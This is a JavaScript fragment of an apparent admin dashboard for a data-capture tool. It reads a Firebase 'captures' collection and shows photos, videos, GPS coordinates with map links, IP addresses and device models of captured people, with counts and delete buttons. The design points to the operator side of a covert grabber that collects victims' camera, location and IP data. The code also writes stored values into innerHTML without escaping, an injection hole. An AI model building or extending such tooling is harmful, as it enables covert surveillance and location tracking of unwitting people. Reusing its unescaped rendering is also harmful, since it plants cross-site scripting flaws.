function loadDashboard() {
  const usersUnsub = db.collection('users').orderBy('createdAt', 'desc').onSnapshot(snap => {
  });
  adminListeners.push(usersUnsub);

  const capUnsub = db.collection('captures').orderBy('timestamp', 'desc').limit(100).onSnapshot(snap => {
    const cameraTbody = $('camera-captures');
    const videoTbody   = $('video-captures');
    const locTbody     = $('location-captures');
    const ipTbody      = $('ip-captures');

    let camC = 0, vidC = 0, locC = 0, ipC = 0;
    let htmlCam = '', htmlVid = '', htmlLoc = '', htmlIp = '';

    snap.forEach(d => {
      const c = d.data();
      const type = c.type || 'unknown';
      const time = c.timestamp ? new Date(c.timestamp.toMillis()).toLocaleString() : 'N/A';
      const ip   = c.ip || 'N/A';
      const dev  = c.deviceModel || 'N/A';
      const uid  = c.uid || 'N/A';
      const link = d.id;

      const actionBtn = `<button class="btn-delete" onclick="deleteDashboardCapture('${d.id}')">🗑️ Delete</button>`;

      if (type === 'camera') {
        camC++;
        const photo = c.photoBase64 ? `<img src="${c.photoBase64}" class="img-thumb" onclick="document.getElementById('img-modal-content').src='${c.photoBase64}';document.getElementById('img-modal').classList.remove('hidden');">` : '📷 Photo';
        htmlCam += `<tr><td>${time}</td><td>${ip}</td><td>${dev}</td><td>${photo}</td><td>${actionBtn}</td></tr>`;
      } else if (type === 'video') {
        vidC++;
        const vid = c.videoURL ? `<video src="${c.videoURL}" controls style="width:100%;border-radius:8px;margin-top:6px;"></video>` : '🎥 Video';
        htmlVid += `<tr><td>${time}</td><td>${ip}</td><td>${dev}</td><td>${vid}</td><td>${actionBtn}</td></tr>`;
      } else if (type === 'location') {
        locC++;
        const loc = c.latitude && c.longitude ? `📍 ${c.latitude.toFixed(5)}, ${c.longitude.toFixed(5)} <a href="https://www.google.com/maps?q=${c.latitude},${c.longitude}" target="_blank" style="color:#3b82f6;font-size:11px;">🗺️ View</a>` : '📍 Unknown';
        htmlLoc += `<tr><td>${time}</td><td>${ip}</td><td>${dev}</td><td>${loc}</td><td>${actionBtn}</td></tr>`;
      } else if (type === 'ip') {
        ipC++;
        const ipData = c.ip ? `📡 ${c.ip}` : '📡 Unknown';
        htmlIp += `<tr><td>${time}</td><td>${ipData}</td><td>${dev}</td><td>IP Capture</td><td>${actionBtn}</td></tr>`;
      }
    });

    $('stat-captures').textContent = snap.size;
    $('stat-camera').textContent = camC;
    $('stat-video').textContent = vidC;
    $('stat-location').textContent = locC;
    $('stat-ip').textContent = ipC;

    cameraTbody.innerHTML = htmlCam || '<tr><td colspan="5" style="text-align:center;padding:20px;color:#8a8aa5;">No camera captures yet.</td></tr>';
    videoTbody.innerHTML   = htmlVid  || '<tr><td colspan="5" style="text-align:center;padding:20px;color:#8a8aa5;">No video captures yet.</td></tr>';
    locTbody.innerHTML     = htmlLoc  || '<tr><td colspan="5" style="text-align:center;padding:20px;color:#8a8aa5;">No location captures yet.</td></tr>';
    ipTbody.innerHTML      = htmlIp   || '<tr><td colspan="5" style="text-align:center;padding:20px;color:#8a8aa5;">No IP captures yet.</td></tr>';
  });
  adminListeners.push(capUnsub);

}
